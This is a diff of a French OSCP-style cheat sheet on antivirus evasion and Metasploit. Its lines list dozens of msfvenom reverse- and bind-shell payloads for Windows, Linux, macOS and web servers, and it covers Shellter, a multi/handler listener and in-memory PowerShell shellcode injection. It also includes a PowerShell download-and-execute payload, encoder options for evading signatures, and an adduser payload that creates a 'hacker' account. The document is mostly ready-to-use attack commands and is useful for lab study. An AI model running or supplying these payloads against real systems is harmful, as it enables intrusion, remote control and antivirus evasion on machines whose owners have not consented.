@@ -7,25 +7,20 @@ description: "Références sur les protections, charges utiles et outils de labo
 
 Références sur les protections, charges utiles et outils de laboratoire.
 
-
 ## Injection en mémoire avec un script PowerShell
 
 Examiner les entrées et les réponses de l'application web.
 
-
 ### Charge utile (Payload)
 
-
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer le fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc
 
 ```
 
-
 ### Scénario
-
 
 <p class="oscp-command-note">PowerShell : définir les imports de fonctions Win32 employés par l'exemple de mémoire.</p>
 
@@ -70,7 +65,6 @@ while ($true) {
 }
 
 ```
-
 
 <p class="oscp-command-note">Extrait de code source Python de l'outil présenté : ne pas le lancer ligne par ligne.</p>
 
@@ -142,8 +136,6 @@ if __name__ == "__main__":
 
 ```
 
-
-
 ### Vérifier la configuration de Defender
 
 Lire l'état du moteur et les dernières mises à jour de signatures, sans désactiver la protection.
@@ -156,14 +148,10 @@ Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,
 
 ## Shellter (outil automatisé)
 
-
-
-
 ```text
 apt-cache search shellter && sudo apt install shellter
 
 ```
-
 
 <p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>
 
@@ -172,14 +160,12 @@ sudo apt install wine
 
 ```
 
-
 <p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Shellter (outil automatisé)» (ne pas exécuter comme une commande).</p>
 
 ```text
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 
 ```
-
 
 <p class="oscp-command-note">Ouvrir la console Metasploit.</p>
 
@@ -188,11 +174,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 
 ```
 
-
 ## Metasploit
-
-
-
 
 ```bash
 sudo msfdb init
@@ -201,32 +183,22 @@ sudo msfconsole
 
 ```
 
-
-
-
 ```text
 workspace -a [nameToGive]
 
 ```
-
-
-
 
 ```text
 search type:auxiliary smb
 
 ```
 
-
-
-
 ```text
 services -p 445 --rhosts
 
 ```
 
-
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer le fichier de sortie avec msfvenom.</p>
 
 ```bash
 # Afficher les charges utiles disponibles
@@ -240,9 +212,7 @@ msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] L
 
 ```
 
-
 ### Écouteurs réseau (Listeners)
-
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
@@ -262,11 +232,9 @@ msf>exploit -j
 
 ```
 
-
 ### Charges utiles principales (Payloads)
 
-
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer le fichier de sortie avec msfvenom.</p>
 
 ```bash
 # Linux
@@ -312,64 +280,44 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 
 ```
 
-
 ### Charges utiles complémentaires (Payloads)
-
 
 **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf**
 
-
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer le fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 
 ```
 
-
 **msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**
-
-
-
 
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 
 ```
 
-
 **msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**
-
-
-
 
 ```bash
 msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 
 ```
 
-
 **msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**
-
-
-
 
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 
 ```
 
-
 **msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**
-
-
-
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```
-
 
 ```bash
 # Générer une charge utile avec msfvenom
@@ -377,160 +325,103 @@ msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="
 
 ```
 
-
 **msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe**
-
-
-
 
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```
 
-
 **msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**
-
-
-
 
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```
 
-
 **msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**
-
-
-
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```
 
-
 **msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe**
-
-
-
 
 ```bash
 msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
 
 ```
 
-
 **msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho**
-
-
-
 
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
 
 ```
 
-
 **msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho**
-
-
-
 
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
 
 ```
 
-
 **msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py**
-
-
-
 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
 
 ```
 
-
 **msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh**
-
-
-
 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
 
 ```
 
-
 **msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl**
-
-
-
 
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
 
 ```
 
-
 **msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp**
-
-
-
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
 
 ```
 
-
 **msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp**
-
-
-
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
 
 ```
 
-
 **msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war**
-
-
-
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 
 ```
 
-
 **msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php**
-
-
-
 
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php
 
 ```
 
-
 **msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php**
-
-
-
 
 ```bash
 msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
 
 ```
-
 
 ```bash
 # Générer une charge utile avec msfvenom
@@ -538,29 +429,19 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Obj
 
 ```
 
-
 **msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"**
-
-
-
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"
 
 ```
 
-
 **msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"**
-
-
-
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
 
 ```
-
-
 
 ### Identifier la version de Metasploit
 
